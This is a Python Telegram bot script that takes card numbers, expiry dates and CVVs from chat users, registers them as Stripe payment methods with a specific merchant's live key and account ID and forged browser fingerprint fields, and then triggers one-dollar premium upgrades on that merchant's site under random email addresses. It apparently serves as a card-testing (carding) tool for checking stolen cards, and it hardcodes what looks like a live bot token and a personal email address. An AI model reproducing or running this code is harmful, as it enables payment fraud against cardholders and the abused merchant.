import telebot
import requests
import random
import string
import time

# Setup your bot
API_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(API_TOKEN)

# Stripe public key (taken from your script)
STRIPE_PUBLIC_KEY = 'pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL'
STRIPE_ACCOUNT = 'acct_1OcwnhGahKpIA11x'

def random_email():
    letters = ''.join(random.choices(string.ascii_lowercase, k=9))
    numbers = ''.join(random.choices(string.digits, k=2))
    return f"{letters}{numbers}"

def create_payment_method(cc, cvv, mes, ano):
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "type": "card",
        "billing_details[email]": "peshangdev@gmail.com",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "guid": "42d8ff38-ab7e-4db6-9158-07c6aae1968bbe1b71",
        "muid": "b478162f-a900-4727-a7f7-63da0ad514c7124f66",
        "sid": "f74d0f5f-482d-4f12-916b-3652ddfcda000be806",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/d991d0758e; stripe-js-v3/d991d0758e; card-element",
        "referrer": "https://www.residenturbanist.com",
        "time_on_page": "50023",
        "key": STRIPE_PUBLIC_KEY,
        "_stripe_account": STRIPE_ACCOUNT
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def upgrade_account(payment_method_id, email):
    url = "https://www.residenturbanist.com/upgrade?_data=routes%2Fupgrade"
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://www.residenturbanist.com",
        "Referer": "https://www.residenturbanist.com/upgrade",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
    }
    data = {
        "email": f"{email}@gmail.com",
        "force_three_d_secure": "false",
        "price_id": "c5106d42-b50c-440e-8a4e-fafeb2691893",
        "payment_method": payment_method_id,
        "upgrade_error_message": "Oops, something went wrong.",
        "upgrade_success_message": "You are now a premium subscriber",
        "amount_cents": "100"
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send /upgrade <cc> <mm> <yy> <cvv> to start the upgrade process.")

@bot.message_handler(commands=['upgrade'])
def handle_upgrade(message):
    try:
        args = message.text.split()[1:]
        if len(args) != 4:
            bot.reply_to(message, "Usage: /upgrade <cc> <mm> <yy> <cvv>")
            return
        
        cc, mm, yy, cvv = args
        email_prefix = random_email()
        bot.send_message(message.chat.id, "Creating payment method...")

        payment_response = create_payment_method(cc, cvv, mm, yy)
        
        if "id" in payment_response and payment_response["id"].startswith("pm_"):
            payment_method_id = payment_response["id"]
            bot.send_message(message.chat.id, f"Payment method created: {payment_method_id}")
            
            time.sleep(5)  # 5-second delay

            upgrade_response = upgrade_account(payment_method_id, email_prefix)
            
            if upgrade_response.get("status") == "success":
                bot.send_message(message.chat.id, "✅ Upgrade successful!")
            else:
                bot.send_message(message.chat.id, f"❌ Upgrade failed: {upgrade_response.get('message', 'Unknown error')}")
        else:
            bot.send_message(message.chat.id, "❌ Failed to create payment method.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

bot.infinity_polling()